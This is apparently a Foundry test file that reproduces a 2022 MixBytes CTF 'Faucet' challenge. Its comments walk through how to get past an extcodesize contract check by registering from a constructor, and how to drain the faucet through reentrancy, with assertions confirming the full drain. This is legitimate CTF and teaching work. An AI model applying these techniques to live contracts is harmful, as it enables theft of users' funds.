// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../contracts/Faucet/Faucet.sol";
import "../contracts/Faucet/FaucetAttack.sol";

/// @title Faucet fake-EOA + reentrancy exploit reproduction
/// @notice MixBytes Farm CTF (2022) - "Faucet" challenge, replayed locally
///         against a vm-managed chain since the original Goerli testnet is gone.
/// @dev assumption: the original Faucet deposit amount used on Goerli was lost
///      together with the testnet. We assume it was 0.01 ether here, i.e.
///      exactly the maximum amount FaucetAttack is able to drain in a single
///      `hack()` call. FaucetAttack's `receive()` only loops until its internal
///      counter `i` reaches 10, so across one external call it can withdraw at
///      most 10 x 0.001 ether = 0.01 ether - this is a hard limit of the
///      attacker contract itself (which we are not allowed to modify), not of
///      the exploit technique. If Faucet held more than 0.01 ether, a full
///      drain would require calling `hack()` multiple times (once per block,
///      since each withdrawal round still has to clear the
///      `users[msg.sender] < block.number` check before it can run again).
/// @dev Faucet.sol and FaucetAttack.sol are intentionally vulnerable / pre-written
///      challenge contracts and are NOT modified by this test.
contract FaucetTest is Test {
    // @dev assumption: original Faucet deposit value (see contract NatSpec above).
    // Exactly the max a single hack() call can drain (10 x 0.001 ether), so the
    // challenge is fully completed (balance -> 0) in one shot.
    uint256 constant FAUCET_DEPOSIT = 0.01 ether;

    Faucet faucet;
    FaucetAttack attack;
    address player;

    function setUp() public {
        player = makeAddr("player");

        // Deploy Faucet, funding it with the (assumed) initial deposit.
        faucet = new Faucet{value: FAUCET_DEPOSIT}();

        // Deploy FaucetAttack from `player` so player owns it (Ownable) and can
        // later call the onlyOwner hack()/withdraw() functions.
        //
        // Vulnerability step 1: FaucetAttack's constructor calls
        // `faucet.register(address(this))` *while FaucetAttack is still being
        // constructed*. At that point `extcodesize(address(this))` is still 0
        // (the deployed code hasn't been written to state yet), so Faucet's
        // `isContract()` check - which only looks at extcodesize - sees the
        // attacker as an EOA and happily registers it, even though right after
        // the constructor returns it is a fully-fledged contract.
        vm.prank(player);
        attack = new FaucetAttack(address(faucet));
    }

    function test_DrainFaucetViaFakeEoaRegistrationAndReentrancy() public {
        console.log("=== Initial state ===");
        console.log("Faucet balance (before):", address(faucet).balance);
        assertEq(address(faucet).balance, FAUCET_DEPOSIT, "faucet should start funded with the assumed deposit");

        // Faucet.withdraw() additionally requires
        // `users[msg.sender] < block.number`, i.e. registration and the first
        // withdrawal must happen in different blocks. FaucetAttack registered
        // itself in the constructor's block, so roll one block forward before
        // withdrawing.
        vm.roll(block.number + 1);

        // Vulnerability step 2 + 3: hack() calls faucet.withdraw(), which pays
        // out 0.001 ether via a low-level `call` *before* resetting
        // `users[msg.sender]` to 0 and setting `paidUsers[msg.sender] = true`.
        // That call lands in FaucetAttack.receive(), which - as long as its
        // counter `i` hasn't reached 10 yet - calls faucet.withdraw() again.
        // Because Faucet's bookkeeping for this user hasn't been updated yet,
        // every reentrant call still passes `users[msg.sender] > 0` and
        // `users[msg.sender] < block.number`, so it gets paid again. The
        // receive() loop runs until i == 10, yielding 10 withdrawals of
        // 0.001 ether each (10 x 0.001 ether = 0.01 ether) from this single
        // external call.
        vm.prank(player);
        attack.hack();

        console.log("=== After hack() (fake-EOA registration + reentrancy drain) ===");
        console.log("Faucet balance (after) :", address(faucet).balance);
        console.log("FaucetAttack balance   :", address(attack).balance);

        assertEq(address(faucet).balance, 0, "Faucet must be fully drained to complete the challenge");
        assertEq(address(attack).balance, FAUCET_DEPOSIT, "FaucetAttack should hold everything drained from Faucet");

        // Sanity: the attacker can also sweep whatever landed in FaucetAttack.
        vm.prank(player);
        attack.withdraw();

        console.log("=== Final state ===");
        console.log("Player balance after withdraw:", player.balance);
        assertEq(player.balance, FAUCET_DEPOSIT, "player should have swept the fully-drained faucet balance");
    }
}
